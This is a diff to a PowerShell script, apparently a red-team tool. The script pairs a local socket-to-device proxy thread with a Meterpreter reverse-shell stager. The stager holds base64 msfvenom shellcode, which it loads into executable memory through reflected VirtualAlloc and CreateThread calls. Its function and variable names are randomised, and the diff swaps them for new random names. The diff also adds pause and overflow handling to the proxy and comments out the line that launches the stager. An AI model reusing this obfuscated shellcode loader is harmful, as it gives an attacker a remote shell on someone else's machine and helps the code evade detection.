@@ -24,6 +24,7 @@ if ($M -eq $null) {
 		}
 	}
 	$f = [n.w]::o($fn)
+	$device = $f
 }
 
 #================== Thread 1 code: the local proxy ==================
@@ -63,6 +64,7 @@ $Proxy = {
 					[System.Console]::WriteLine([String]::Format("Socket {0} - Device {1}", $stotal, $dtotal))
 					$sb[1] = $sbr
 					$device.Write($sb, 0, $M+1)
+					$device_can_write = $false
 					$st = $socket.BeginRead($sb, 2, ($M-1), $null, $null)
 				} else {
 					$st = $null
@@ -71,6 +73,14 @@ $Proxy = {
 				$dbr = $device.EndRead($dt)
 				if ($dbr -gt 0) {
 					$device_can_write = (($db[1] -band 128) -eq 0)
+					if (!$device_can_write) {
+						Write-Host "Paused!"
+					}
+					$write_overflow = (($db[1] -band 64) -ne 0)
+					if ($write_overflow) {
+						Write-Host "Overflow!"
+						exit
+					}
 					$db[1] = ($db[1] -band 63)
 					if ($db[1] -gt 0) {
 						$dtotal += $db[1]
@@ -108,33 +118,33 @@ $MeterpreterStager = {
 	[System.Console]::WriteLine("Meterpreter thread started")
 	# If this stager is used, pay attention to call this script from the 32 bits version of powershell: C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe
 	# Generated using: msfvenom -p windows/shell/reverse_tcp -f psh-reflection LHOST=127.0.0.1 LPORT=65535
-	function kxuXDoOD {
-		Param ($oeT1W4ZSIx, $faTmlV)
-		$drJ_cQvaI_YJ = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+	function ogz2 {
+		Param ($x3Vs, $nkS7QSA)
+		$shlUOd4 = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
 
-		return $drJ_cQvaI_YJ.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($drJ_cQvaI_YJ.GetMethod('GetModuleHandle')).Invoke($null, @($oeT1W4ZSIx)))), $faTmlV))
+		return $shlUOd4.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($shlUOd4.GetMethod('GetModuleHandle')).Invoke($null, @($x3Vs)))), $nkS7QSA))
 	}
 
-	function gzWzvv4M {
+	function jsf8RUi4D {
 		Param (
-			[Parameter(Position = 0, Mandatory = $True)] [Type[]] $s_PQj66,
-			[Parameter(Position = 1)] [Type] $we_hKcql = [Void]
+			[Parameter(Position = 0, Mandatory = $True)] [Type[]] $eUj0vp6,
+			[Parameter(Position = 1)] [Type] $uXCOGO = [Void]
 		)
 
-		$sJBXEy = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
-		$sJBXEy.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $s_PQj66).SetImplementationFlags('Runtime, Managed')
-		$sJBXEy.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $we_hKcql, $s_PQj66).SetImplementationFlags('Runtime, Managed')
+		$uKcu45F_ = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+		$uKcu45F_.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $eUj0vp6).SetImplementationFlags('Runtime, Managed')
+		$uKcu45F_.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $uXCOGO, $eUj0vp6).SetImplementationFlags('Runtime, Managed')
 
-		return $sJBXEy.CreateType()
+		return $uKcu45F_.CreateType()
 	}
 
-	[Byte[]]$rLbemwKoxU6 = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEAACnEVFBoKYBrAP/VagVofwAAAWgCAP//ieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04IdezoYQAAAGoAagRWV2gC2chf/9WD+AB+Nos2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1YP4AH0iWGgAQAAAagBQaAsvDzD/1VdodW5NYf/VXl7/DCTpcf///wHDKcZ1x8O78LWiVmoAU//V")
+	[Byte[]]$vjavcb5X2 = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEAACnEVFBoKYBrAP/VagVofwAAAWgCAP//ieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04IdezoYQAAAGoAagRWV2gC2chf/9WD+AB+Nos2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1YP4AH0iWGgAQAAAagBQaAsvDzD/1VdodW5NYf/VXl7/DCTpcf///wHDKcZ1x8O78LWiVmoAU//V")
 
-	$d1nQU = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((kxuXDoOD kernel32.dll VirtualAlloc), (gzWzvv4M @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $rLbemwKoxU6.Length,0x3000, 0x40)
-	[System.Runtime.InteropServices.Marshal]::Copy($rLbemwKoxU6, 0, $d1nQU, $rLbemwKoxU6.length)
+	$vUUS = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((ogz2 kernel32.dll VirtualAlloc), (jsf8RUi4D @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $vjavcb5X2.Length,0x3000, 0x40)
+	[System.Runtime.InteropServices.Marshal]::Copy($vjavcb5X2, 0, $vUUS, $vjavcb5X2.length)
 
-	$ajA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((kxuXDoOD kernel32.dll CreateThread), (gzWzvv4M @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$d1nQU,[IntPtr]::Zero,0,[IntPtr]::Zero)
-	[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((kxuXDoOD kernel32.dll WaitForSingleObject), (gzWzvv4M @([IntPtr], [Int32]))).Invoke($ajA,0xffffffff) | Out-Null
+	$z4da = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((ogz2 kernel32.dll CreateThread), (jsf8RUi4D @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$vUUS,[IntPtr]::Zero,0,[IntPtr]::Zero)
+	[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((ogz2 kernel32.dll WaitForSingleObject), (jsf8RUi4D @([IntPtr], [Int32]))).Invoke($z4da,0xffffffff) | Out-Null
 }
 
 #================= Launch both threads =================
@@ -153,7 +163,7 @@ try {
 	$AsyncProxyJobResult = $proxyThread.BeginInvoke()
 
 	Sleep 2 # Wait 2 seconds to give some time for the proxy to be ready
-	$AsyncMeterpreterJobResult = $meterpreterThread.BeginInvoke()
+#	$AsyncMeterpreterJobResult = $meterpreterThread.BeginInvoke()
 }
 catch {
 	$ErrorMessage = $_.Exception.Message
@@ -161,9 +171,9 @@ catch {
 }
 finally {
 	if ($proxyThread -ne $null -and $AsyncProxyJobResult -ne $null) {
-        $proxyThread.EndInvoke($AsyncProxyJobResult)
-        $proxyThread.Dispose()
-    }
+		$proxyThread.EndInvoke($AsyncProxyJobResult)
+		$proxyThread.Dispose()
+	}
 
 	if ($meterpreterThread -ne $null -and $AsyncMeterpreterJobResult -ne $null) {
 		$meterpreterThread.EndInvoke($AsyncMeterpreterJobResult)
